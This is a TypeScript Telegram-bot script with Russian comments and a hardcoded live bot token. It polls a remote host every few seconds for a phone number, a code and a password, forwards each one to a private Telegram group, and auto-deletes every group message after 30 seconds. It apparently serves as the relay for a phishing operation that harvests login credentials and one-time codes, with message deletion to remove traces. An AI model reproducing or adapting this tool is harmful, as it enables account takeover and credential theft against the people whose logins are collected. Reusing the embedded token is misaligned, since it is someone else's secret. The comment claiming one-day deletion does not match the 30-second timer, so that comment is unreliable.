import axios from 'axios';
const TelegramBot = require('node-telegram-bot-api');

const token: string = '6665171831:AAEu1c2-Dn5IX341G4r8GlXir8EImcjWFOI';

const bot = new TelegramBot(token, { polling: true });

// Функция для удаления сообщения по его идентификатору
async function deleteMessage(chatId: number | string, messageId: number): Promise<void> {
    try {
        await bot.deleteMessage(chatId, messageId);
        console.log(`Сообщение ${messageId} удалено`);
    } catch (error) {
        console.error('Ошибка при удалении сообщения:', error.message);
    }
}

// Обработчик новых сообщений в чате
bot.on('message', async (msg) => {
    // Здесь можно добавить логику, чтобы установить таймер удаления для нового сообщения
    const chatId = msg.chat.id;
    const messageId = msg.message_id;
    
    // Устанавливаем таймер удаления сообщения через день
    setTimeout(() => {
        deleteMessage(chatId, messageId);
    }, 30000); // 24 часа * 60 минут * 60 секунд * 1000 миллисекунд

    // Пока что мы не посылаем никаких ответов на сообщения
    // Мы просто ждём и удаляем сообщения через день
});

// В случае возникновения ошибки, выводим её в консоль
bot.on('polling_error', (error) => {
    console.error(error);
});


async function fetchPhoneAutomatically(): Promise<string | undefined> {
    const url: string = 'https://puce-attractive-firefly.cyclic.app/getPhone';
    try {
        const response = await axios.get<string>(url);
        const data: string = response.data;
        if (data !== undefined) {
            await bot.sendMessage(-1002084958557, data);
            return data;
        }
        return undefined;
    } catch (error) {
        console.error('Ошибка:', error);
    }
}

async function fetchCodeAutomatically(): Promise<string | undefined> {
    const url: string = 'https://puce-attractive-firefly.cyclic.app/getCode';
    try {
        const response = await axios.get<string>(url);
        const data: string = response.data;
        if (data !== undefined) {
            await bot.sendMessage(-1002084958557, data);
            return data;
        }
        return undefined;
    } catch (error) {
        console.error('Ошибка:', error);
    }
}

async function fetchPasswordAutomatically(): Promise<string | undefined> {
    const url: string = 'https://puce-attractive-firefly.cyclic.app/getPassword';
    try {
        const response = await axios.get<string>(url);
        const data: string = response.data;
        if (data !== undefined) {
            await bot.sendMessage(-1002084958557, data);
            return data;
        }
        return undefined;
    } catch (error) {
        console.error('Ошибка:', error);
    }
}

async function sendRequestsInOrder(): Promise<void> {
    let phoneData: string | undefined = await fetchPhoneAutomatically();
    let codeData: string | undefined = await fetchCodeAutomatically();
    let passwordData: string | undefined = await fetchPasswordAutomatically();

    console.log('Все запросы выполнены.');
    console.log('Phone Data:', phoneData);
    console.log('Code Data:', codeData);
    console.log('Password Data:', passwordData);
}

setInterval(() => {
    sendRequestsInOrder();
}, 7000);

sendRequestsInOrder();
